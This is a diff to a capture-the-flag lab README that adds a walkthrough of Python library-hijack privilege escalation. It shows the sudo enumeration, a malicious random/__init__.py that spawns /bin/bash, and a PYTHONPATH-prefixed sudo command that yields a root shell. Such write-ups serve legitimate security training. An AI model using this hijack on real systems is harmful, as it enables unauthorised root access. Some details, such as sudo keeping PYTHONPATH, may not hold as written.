@@ -25,100 +25,127 @@ Password: password
 
 ---
 
+## 📌 Hints
+- Use `sudo -l` to check for **executable scripts with sudo privileges**.
+- Find out which **libraries** the vulnerable script imports.
+- Hijack the **imported library** to execute arbitrary code.
+
+---
+
+> # Writeup
+
 ## 🔍 Enumeration & Exploitation
+
 ### 1️⃣ **Initial Access**
-- The attacker discovers **credentials** for SSH login:  
-  **Username:** `ctfuser`  
-  **Password:** `password`
+
+- The attacker discovers **credentials** for SSH login:**Username:** `ctfuser`**Password:** `password`
 - Using the credentials, they connect via SSH:
-  ```bash
-  ssh ctfuser@localhost -p 2222
-  ```
+    
+    ```bash
+    ssh ctfuser@localhost -p 2222
+    
+    ```
+    
 
 ### 2️⃣ **Privilege Escalation - Enumerating sudo Permissions**
+
 - Running the following command reveals a **sudo misconfiguration**:
-  ```bash
-  sudo -l
-  ```
+    
+    ```bash
+    sudo -l
+    
+    ```
+    
 - Output:
-  ```
-  (ALL) NOPASSWD: /usr/bin/python3 vulnerable_script.py
-  ```
+    
+    ```
+    (ALL) NOPASSWD: /usr/bin/python3 vulnerable_script.py
+    
+    ```
+    
 - This means `ctfuser` can execute `vulnerable_script.py` **as root** without a password.
 
 ### 3️⃣ **Analyzing the Vulnerable Script**
-- Checking the contents of `/opt/scripts/vulnerable_script.py`:
-  ```bash
-  cat /opt/scripts/vulnerable_script.py
-  ```
-  **Output:**
-  ```python
-  import random
-  choices = ["Rock", "Paper", "Scissors"]
-  computer = random.choice(choices)
-  player = False
-  cpu_score = 0
-  player_score = 0
-  while True:
-    player = input("Rock, Paper or  Scissors?").capitalize()
-    ## Conditions of Rock,Paper and Scissors
-    if player == computer:
-        print("Tie!")
-    elif player == "Rock":
-        if computer == "Paper":
-            print("You lose!", computer, "covers", player)
-            cpu_score+=1
-        else:
-            print("You win!", player, "smashes", computer)
-            player_score+=1
-    elif player == "Paper":
-        if computer == "Scissors":
-            print("You lose!", computer, "cut", player)
-            cpu_score+=1
-        else:
-            print("You win!", player, "covers", computer)
-            player_score+=1
-    elif player == "Scissors":
-        if computer == "Rock":
-            print("You lose...", computer, "smashes", player)
-            cpu_score+=1
-        else:
-            print("You win!", player, "cut", computer)
-            player_score+=1
-    elif player=='End':
-        print("Final Scores:")
-        print(f"CPU:{cpu_score}")
-        print(f"Plaer:{player_score}")
-        break
-  ```
+
+- Checking the contents of `/opt/scripts/vulnerable_script.py`:**Output:**
+    
+    ```bash
+    cat /opt/scripts/vulnerable_script.py
+    
+    ```
+    
+    ```python
+    import random
+    choices = ["Rock", "Paper", "Scissors"]
+    computer = random.choice(choices)
+    player = False
+    cpu_score = 0
+    player_score = 0
+    while True:
+      player = input("Rock, Paper or  Scissors?").capitalize()
+      ## Conditions of Rock,Paper and Scissors
+      if player == computer:
+          print("Tie!")
+      elif player == "Rock":
+          if computer == "Paper":
+              print("You lose!", computer, "covers", player)
+              cpu_score+=1
+          else:
+              print("You win!", player, "smashes", computer)
+              player_score+=1
+      elif player == "Paper":
+          if computer == "Scissors":
+              print("You lose!", computer, "cut", player)
+              cpu_score+=1
+          else:
+              print("You win!", player, "covers", computer)
+              player_score+=1
+      elif player == "Scissors":
+          if computer == "Rock":
+              print("You lose...", computer, "smashes", player)
+              cpu_score+=1
+          else:
+              print("You win!", player, "cut", computer)
+              player_score+=1
+      elif player=='End':
+          print("Final Scores:")
+          print(f"CPU:{cpu_score}")
+          print(f"Plaer:{player_score}")
+          break
+    
+    ```
+    
 - The script imports **random**, which we can **hijack**!
 
 ### 4️⃣ **Exploiting Library Hijacking**
+
 - We create a **malicious version** of `random.py` in `/tmp`:
-  ```bash
-  mkdir -p /tmp/random
-  echo 'import os; os.system("/bin/bash")' > /tmp/random/__init__.py
-  ```
+    
+    ```bash
+    mkdir -p /tmp/random
+    echo 'import os; os.system("/bin/bash")' > /tmp/random/__init__.py
+    
+    ```
+    
 - Set the `PYTHONPATH` to prioritize our malicious library:
-  ```bash
-  PYTHONPATH=/tmp sudo /usr/bin/python3 /opt/scripts/vulnerable_script.py
-  ```
+    
+    ```bash
+    PYTHONPATH=/tmp sudo /usr/bin/python3 /opt/scripts/vulnerable_script.py
+    
+    ```
+    
 - This spawns a **root shell**! 🎉
 
 ---
 
 ## 🏆 Capture the Flag
+
 Once you gain root access, find the flag inside:
+
 ```bash
 cat /root/flag.txt
+
 ```
-
----
-
-## 📌 Hints
-- Use `sudo -l` to check for **executable scripts with sudo privileges**.
-- Find out which **libraries** the vulnerable script imports.
-- Hijack the **imported library** to execute arbitrary code.
 
 ---
 
